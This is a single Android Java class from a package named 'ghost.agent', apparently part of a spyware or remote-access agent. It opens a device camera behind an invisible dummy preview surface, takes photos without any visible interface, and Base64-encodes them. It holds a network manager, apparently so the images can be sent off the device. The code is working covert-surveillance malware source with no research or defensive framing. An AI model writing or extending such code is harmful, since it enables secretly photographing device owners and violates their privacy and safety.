package com.ghost.agent.core;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.Camera;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceView;

import java.io.ByteArrayOutputStream;

public class CameraManager {
    
    private static final String TAG = "CameraManager";
    
    private Context context;
    private NetworkManager networkManager;
    private Camera camera;
    private boolean isActive = false;
    private int currentCameraId = 0;
    
    public CameraManager(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
    }
    
    public void startCamera(int cameraId) {
        if (isActive) stopCamera();
        
        try {
            currentCameraId = cameraId;
            camera = Camera.open(cameraId);
            
            Camera.Parameters params = camera.getParameters();
            params.setPictureFormat(ImageFormat.JPEG);
            params.setJpegQuality(85);
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
            
            Camera.Size size = getBestPictureSize(params);
            params.setPictureSize(size.width, size.height);
            
            camera.setParameters(params);
            
            SurfaceView dummy = new SurfaceView(context);
            camera.setPreviewDisplay(dummy.getHolder());
            camera.startPreview();
            
            isActive = true;
            Log.i(TAG, "Caméra " + cameraId + " démarrée");
            
        } catch (Exception e) {
            Log.e(TAG, "Erreur: " + e.getMessage());
        }
    }
    
    public String takePhoto() {
        if (camera == null || !isActive) return null;
        
        final String[] photoBase64 = new String[1];
        final Object lock = new Object();
        
        camera.takePicture(null, null, (data, cam) -> {
            photoBase64[0] = Base64.encodeToString(data, Base64.NO_WRAP);
            cam.startPreview();
            synchronized (lock) {
                lock.notify();
            }
        });
        
        try {
            synchronized (lock) {
                lock.wait(5000);
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        
        return photoBase64[0];
    }
    
    public void stopCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
        isActive = false;
        Log.i(TAG, "Caméra arrêtée");
    }
    
    private Camera.Size getBestPictureSize(Camera.Parameters params) {
        Camera.Size best = null;
        int bestArea = 0;
        
        for (Camera.Size size : params.getSupportedPictureSizes()) {
            int area = size.width * size.height;
            if (area > bestArea && area <= 1920 * 1080) {
                bestArea = area;
                best = size;
            }
        }
        return best;
    }
}
